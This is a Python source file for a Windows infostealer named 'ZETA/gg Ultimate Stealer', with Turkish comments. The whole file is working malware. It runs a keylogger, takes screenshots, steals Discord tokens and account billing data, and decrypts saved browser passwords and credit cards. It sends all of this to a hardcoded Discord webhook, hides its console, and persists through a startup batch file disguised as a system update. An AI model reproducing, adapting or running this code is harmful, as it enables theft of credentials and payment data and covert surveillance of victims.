import os
import json
import re
import sqlite3
import base64
import requests
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime
import threading
import sys
import time
import ctypes
from PIL import ImageGrab
import browser_cookie3
import urllib3
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Webhook URL'niz
WEBHOOK_URL = "https://discord.com/api/webhooks/1408193231375695942/k5JnJtc007i2Ge_uhheKfjQXgPAxsrYJ2L6AJKf-1RFx6F6akZVz_NldslS4ahikrdAA"

# SSL uyarılarını kapat
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Windows API için tanımlamalar
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104


class UltimateStealer:
    def __init__(self):
        self.tokens = []
        self.embeds = []
        self.computer_name = os.getenv('COMPUTERNAME', 'UNKNOWN')
        self.username = os.getenv('USERNAME', 'UNKNOWN')
        self.session = self.create_session()
        self.key_logs = []
        self.key_log_file = os.path.join(os.getenv('TEMP'), 'key_logs.txt')
        self.last_screenshot_time = 0
        self.screenshot_interval = 60
        self.hook_id = None
        self.browser_data = []
        self.setup_keyboard_hook()

    def create_session(self):
        """Gelişmiş retry mekanizması ile session oluştur"""
        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def keyboard_callback(self, nCode, wParam, lParam):
        """Klavye olaylarını yakalar"""
        if nCode >= 0 and (wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN):
            vkCode = ctypes.c_ulongfrom_address(lParam).value
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            # Tuş haritası
            key_map = {
                8: '[BACKSPACE]', 9: '[TAB]', 13: '[ENTER]\n', 27: '[ESC]',
                32: ' ', 160: '[SHIFT]', 161: '[SHIFT]', 162: '[CTRL]',
                163: '[CTRL]', 164: '[ALT]', 165: '[ALT]', 91: '[WIN]',
                92: '[WIN]', 144: '[NUM_LOCK]', 145: '[SCROLL_LOCK]',
                46: '[DELETE]', 35: '[END]', 36: '[HOME]', 33: '[PAGE_UP]',
                34: '[PAGE_DOWN]', 37: '[LEFT]', 38: '[UP]', 39: '[RIGHT]',
                40: '[DOWN]', 112: '[F1]', 113: '[F2]', 114: '[F3]', 115: '[F4]',
                116: '[F5]', 117: '[F6]', 118: '[F7]', 119: '[F8]', 120: '[F9]',
                121: '[F10]', 122: '[F11]', 123: '[F12]'
            }

            # Tuşu al
            if vkCode in key_map:
                key_char = key_map[vkCode]
            else:
                # Karakter tuşları
                buffer = ctypes.create_unicode_buffer(256)
                keyboard_state = ctypes.create_string_buffer(256)
                user32.GetKeyboardState(keyboard_state)
                result = user32.ToUnicode(vkCode, 0, keyboard_state, buffer, 256, 0)
                if result > 0:
                    key_char = buffer.value
                else:
                    key_char = f'[VK_{vkCode}]'

            log_entry = f"{current_time} - {key_char}"
            self.key_logs.append(log_entry)

            # Her 10 tuşta bir dosyaya yaz
            if len(self.key_logs) >= 10:
                self.save_key_logs()

        return user32.CallNextHookEx(self.hook_id, nCode, wParam, lParam)

    def setup_keyboard_hook(self):
        """Klavye hook'unu kur"""
        HOOKPROC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
        self.keyboard_callback_func = HOOKPROC(self.keyboard_callback)

        self.hook_id = user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            self.keyboard_callback_func,
            kernel32.GetModuleHandleA(None),
            0
        )

    def save_key_logs(self):
        """Klavye kayıtlarını dosyaya yaz"""
        try:
            with open(self.key_log_file, 'a', encoding='utf-8') as f:
                for log in self.key_logs:
                    f.write(log)
            self.key_logs = []
        except:
            pass

    def capture_screenshot(self):
        """Ekran görüntüsü alır"""
        try:
            screenshot = ImageGrab.grab()
            screenshot_path = os.path.join(os.getenv('TEMP'),
                                           f'screen_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
            screenshot.save(screenshot_path)
            return screenshot_path
        except:
            return None

    def continuous_screenshot(self):
        """Sürekli ekran görüntüsü alma"""
        while True:
            try:
                current_time = time.time()
                if current_time - self.last_screenshot_time >= self.screenshot_interval:
                    screenshot_path = self.capture_screenshot()
                    if screenshot_path:
                        self.send_screenshot_to_webhook(screenshot_path)
                        self.last_screenshot_time = current_time
                time.sleep(1)
            except:
                time.sleep(10)

    def send_screenshot_to_webhook(self, screenshot_path):
        """Sadece ekran görüntüsü gönder"""
        try:
            if os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    files = {'file': ('screenshot.png', f, 'image/png')}

                    payload = {
                        "username": "📸 ZETA/gg Screenshot",
                        "avatar_url": "https://i.imgur.com/7X8gazR.png",
                        "content": f"**🖥️ Ekran Görüntüsü**\n**Zaman:** {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n**PC:** {self.computer_name}"
                    }

                    response = self.session.post(WEBHOOK_URL, data={'payload_json': json.dumps(payload)}, files=files,
                                                 timeout=30)

                    if response.status_code in [200, 204]:
                        print(f"✅ Ekran görüntüsü gönderildi")
                    else:
                        print(f"❌ Ekran görüntüsü gönderilemedi")

                os.remove(screenshot_path)
        except Exception as e:
            pass

    def send_keylogs_to_webhook(self):
        """Klavye kayıtlarını gönder"""
        try:
            if os.path.exists(self.key_log_file) and os.path.getsize(self.key_log_file) > 0:
                with open(self.key_log_file, 'rb') as f:
                    files = {'file': ('key_logs.txt', f, 'text/plain')}

                    payload = {
                        "username": "⌨️ ZETA/gg Keylogger",
                        "avatar_url": "https://i.imgur.com/7X8gazR.png",
                        "content": f"**⌨️ Klavye Kayıtları**\n**Zaman:** {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n**PC:** {self.computer_name}\n**Kullanıcı:** {self.username}"
                    }

                    response = self.session.post(WEBHOOK_URL, data={'payload_json': json.dumps(payload)}, files=files,
                                                 timeout=30)

                    if response.status_code in [200, 204]:
                        print("✅ Klavye kayıtları gönderildi")
                        open(self.key_log_file, 'w').close()
        except:
            pass

    def get_tokens(self):
        """Tüm olası token kaynaklarını tarar"""
        tokens = set()
        paths_to_scan = [
            os.getenv('APPDATA') + r'\Discord\Local Storage\leveldb',
            os.getenv('APPDATA') + r'\discordcanary\Local Storage\leveldb',
            os.getenv('APPDATA') + r'\discordptb\Local Storage\leveldb',
            os.getenv('LOCALAPPDATA') + r'\Discord\Local Storage\leveldb',
            os.getenv('LOCALAPPDATA') + r'\Google\Chrome\User Data\Default\Local Storage\leveldb',
            os.getenv('LOCALAPPDATA') + r'\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb',
            os.getenv('APPDATA') + r'\Opera Software\Opera Stable\Local Storage\leveldb',
            os.getenv('LOCALAPPDATA') + r'\Microsoft\Edge\User Data\Default\Local Storage\leveldb',
            os.getenv('APPDATA') + r'\Mozilla\Firefox\Profiles',
        ]

        for path in paths_to_scan:
            if not os.path.exists(path):
                continue
            try:
                if 'Firefox' in path:
                    self.scan_firefox_profiles(path, tokens)
                else:
                    self.scan_leveldb_files(path, tokens)
            except:
                continue
        return list(tokens)

    def scan_leveldb_files(self, path, tokens):
        """LevelDB dosyalarını tarar"""
        for file_name in os.listdir(path):
            if not (file_name.endswith('.ldb') or file_name.endswith('.log')):
                continue
            try:
                file_path = os.path.join(path, file_name)
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                    content = file.read()
                    patterns = [
                        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
                        r'mfa\.[\w-]{84}',
                        r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}',
                    ]
                    for pattern in patterns:
                        found_tokens = re.findall(pattern, content)
                        tokens.update(found_tokens)
            except:
                continue

    def scan_firefox_profiles(self, path, tokens):
        """Firefox profillerini tarar"""
        for profile in os.listdir(path):
            profile_path = os.path.join(path, profile)
            if os.path.isdir(profile_path):
                cookies_path = os.path.join(profile_path, 'cookies.sqlite')
                if os.path.exists(cookies_path):
                    try:
                        conn = sqlite3.connect(cookies_path)
                        cursor = conn.cursor()
                        cursor.execute("SELECT name, value FROM moz_cookies WHERE host LIKE '%discord%'")
                        for name, value in cursor.fetchall():
                            if 'token' in name.lower() and len(value) > 50:
                                tokens.add(value)
                    except:
                        pass
                    finally:
                        conn.close()

    def get_user_data(self, token):
        """Token ile kullanıcı verilerini getirir"""
        endpoints = [
            'https://discord.com/api/v9/users/@me',
            'https://discordapp.com/api/v9/users/@me',
            'https://canary.discord.com/api/v9/users/@me'
        ]
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        for endpoint in endpoints:
            try:
                response = self.session.get(endpoint, headers=headers, timeout=10, verify=False)
                if response.status_code == 200:
                    return response.json()
            except:
                continue
        return None

    def get_billing_info(self, token):
        """Ödeme bilgilerini getirir"""
        endpoints = [
            'https://discord.com/api/v9/users/@me/billing/payment-sources',
            'https://discordapp.com/api/v9/users/@me/billing/payment-sources'
        ]
        headers = {'Authorization': token}
        for endpoint in endpoints:
            try:
                response = self.session.get(endpoint, headers=headers, timeout=10, verify=False)
                if response.status_code == 200:
                    return response.json()
            except:
                continue
        return None

    def extract_browser_data(self):
        """Tarayıcı verilerini çıkarır"""
        browsers = {
            "Chrome": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),
            "Edge": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"),
            "Opera": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software",
                                     "Opera GX Stable")
        }

        results = []

        for name, path in browsers.items():
            if os.path.exists(path):
                try:
                    key = self.get_encryption_key(path)
                    if key:
                        # Şifreleri çıkar
                        passwords = self.extract_passwords(name, path, key)
                        results.extend(passwords)

                        # Kredi kartlarını çıkar
                        cards = self.extract_credit_cards(name, path, key)
                        results.extend(cards)
                except:
                    continue

        return results

    def get_encryption_key(self, browser_path):
        try:
            with open(os.path.join(browser_path, "Local State"), "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except:
            return None

    def decrypt_password(self, password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
            except:
                return "Şifre çözülemedi"

    def extract_passwords(self, browser_name, browser_path, key):
        results = []
        try:
            login_data_path = os.path.join(browser_path, "Default", "Login Data")
            if not os.path.exists(login_data_path):
                login_data_path = os.path.join(browser_path, "Login Data")

            temp_db = os.path.join(os.environ["TEMP"],
                                   f"temp_login_data_{browser_name}_{datetime.now().strftime('%H%M%S')}.db")
            shutil.copy2(login_data_path, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url, username, encrypted_password = row
                if encrypted_password:
                    decrypted_password = self.decrypt_password(encrypted_password, key)
                    if username and decrypted_password and decrypted_password != "Şifre çözülemedi":
                        results.append({
                            "type": "🔑 Şifre",
                            "browser": browser_name,
                            "url": url,
                            "kullanıcı": username,
                            "veri": decrypted_password,
                            "zaman": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        })
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
        except:
            pass
        return results

    def extract_credit_cards(self, browser_name, browser_path, key):
        results = []
        try:
            cards_path = os.path.join(browser_path, "Default", "Web Data")
            if not os.path.exists(cards_path):
                cards_path = os.path.join(browser_path, "Web Data")

            temp_db = os.path.join(os.environ["TEMP"],
                                   f"temp_cards_{browser_name}_{datetime.now().strftime('%H%M%S')}.db")
            shutil.copy2(cards_path, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")

            for row in cursor.fetchall():
                name, month, year, encrypted_card = row
                if encrypted_card:
                    decrypted_card = self.decrypt_password(encrypted_card, key)
                    if decrypted_card and len(decrypted_card) >= 14 and decrypted_card != "Şifre çözülemedi":
                        results.append({
                            "type": "💳 Kredi Kartı",
                            "browser": browser_name,
                            "url": "N/A",
                            "kullanıcı": name,
                            "veri": f"{decrypted_card} | {month:02d}/{year}",
                            "zaman": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        })
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
        except:
            pass
        return results

    def send_browser_data_to_webhook(self, browser_data):
        """Tarayıcı verilerini webhook'a gönder"""
        if not browser_data:
            return

        try:
            formatted_data = "\n".join(
                [f"{item['browser']} | {item['type']} | {item['url']} | {item['kullanıcı']} | {item['veri']}" for item
                 in browser_data[:50]])

            payload = {
                "username": "🌐 ZETA/gg Browser Stealer",
                "avatar_url": "https://i.imgur.com/7X8gazR.png",
                "content": f"**🌐 Tarayıcı Verileri**\n**Zaman:** {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n**PC:** {self.computer_name}\n**Toplam:** {len(browser_data)} veri\n```\n{formatted_data}\n```"
            }

            response = self.session.post(WEBHOOK_URL, json=payload, timeout=30)
            if response.status_code in [200, 204]:
                print("✅ Tarayıcı verileri gönderildi")
        except:
            pass

    def send_to_webhook(self, embeds, screenshot_path=None):
        """Webhook'a veri gönderir"""
        if not embeds:
            return False
        payload = {
            "username": "🔥 ZETA/gg Ultimate Stealer",
            "avatar_url": "https://i.imgur.com/7X8gazR.png",
            "embeds": embeds,
            "content": f"🚨 **YENİ KURBAN!** 🚨\n**Zaman:** {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n**PC:** {self.computer_name}\n**Kullanıcı:** {self.username}"
        }
        files = {}
        if screenshot_path and os.path.exists(screenshot_path):
            files['file'] = ('screenshot.png', open(screenshot_path, 'rb'), 'image/png')
        try:
            if files:
                response = self.session.post(WEBHOOK_URL, data={'payload_json': json.dumps(payload)}, files=files,
                                             timeout=30)
            else:
                response = self.session.post(WEBHOOK_URL, json=payload, timeout=30)
            return response.status_code in [200, 204]
        except:
            return False
        finally:
            if files and 'file' in files:
                files['file'][1].close()

    def create_embed(self, user_data, token, billing_info):
        """Zengin embed oluşturur"""
        return {
            "title": "🎭 ZETA/gg Ultimate Stealer",
            "color": 0xFF0000,
            "timestamp": datetime.now().isoformat(),
            "fields": [
                {"name": "🔑 Token", "value": f"```{token}```", "inline": False},
                {"name": "👤 Kullanıcı",
                 "value": f"`{user_data.get('username', 'N/A')}#{user_data.get('discriminator', 'N/A')}`",
                 "inline": True},
                {"name": "🆔 ID", "value": f"`{user_data.get('id', 'N/A')}`", "inline": True},
                {"name": "📧 Email", "value": f"`{user_data.get('email', 'N/A')}`", "inline": True},
                {"name": "📞 Telefon", "value": f"`{user_data.get('phone', 'N/A')}`", "inline": True},
                {"name": "💰 Premium", "value": f"`{user_data.get('premium_type', 'Yok')}`", "inline": True},
                {"name": "💳 Ödeme Yöntemleri", "value": f"`{len(billing_info) if billing_info else 0}`",
                 "inline": True},
                {"name": "💻 Bilgisayar", "value": f"`{self.computer_name}`", "inline": True},
                {"name": "👤 Windows Kullanıcı", "value": f"`{self.username}`", "inline": True}
            ],
            "footer": {
                "text": "ZETA/gg • Ultimate Stealer • 2035",
                "icon_url": "https://i.imgur.com/7X8gazR.png"
            },
            "thumbnail": {
                "url": f"https://cdn.discordapp.com/avatars/{user_data.get('id')}/{user_data.get('avatar')}.png?size=1024" if user_data.get(
                    'avatar') else ""
            }
        }

    def execute_stealer(self):
        """Ana stealer fonksiyonu"""
        # Discord tokenleri
        tokens = self.get_tokens()
        screenshot_path = self.capture_screenshot()

        for token in tokens:
            user_data = self.get_user_data(token)
            if user_data:
                billing_info = self.get_billing_info(token)
                embed = self.create_embed(user_data, token, billing_info)
                self.embeds.append(embed)

        # Tarayıcı verileri
        browser_data = self.extract_browser_data()
        if browser_data:
            self.send_browser_data_to_webhook(browser_data)

        # Discord embed'leri gönder
        if self.embeds:
            self.send_to_webhook(self.embeds, screenshot_path)

        # Temizlik
        if screenshot_path and os.path.exists(screenshot_path):
            os.remove(screenshot_path)

    def main_loop(self):
        """Ana döngü"""
        # Ekran görüntüsü thread'i
        screenshot_thread = threading.Thread(target=self.continuous_screenshot, daemon=True)
        screenshot_thread.start()

        # Ana stealer döngüsü
        while True:
            try:
                self.execute_stealer()
                self.send_keylogs_to_webhook()
                time.sleep(300)
            except:
                time.sleep(60)


def hide_console():
    """Konsolu gizler"""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass


def add_to_startup():
    """Windows startup'a ekler"""
    try:
        startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        bat_path = os.path.join(startup_path, "Windows_System_Update.bat")
        with open(bat_path, "w") as bat_file:
            bat_file.write(f"@echo off\nstart /min pythonw \"{os.path.abspath(__file__)}\" >nul 2>&1")
    except:
        pass


if __name__ == "__main__":
    hide_console()
    add_to_startup()

    stealer = UltimateStealer()
    stealer.main_loop()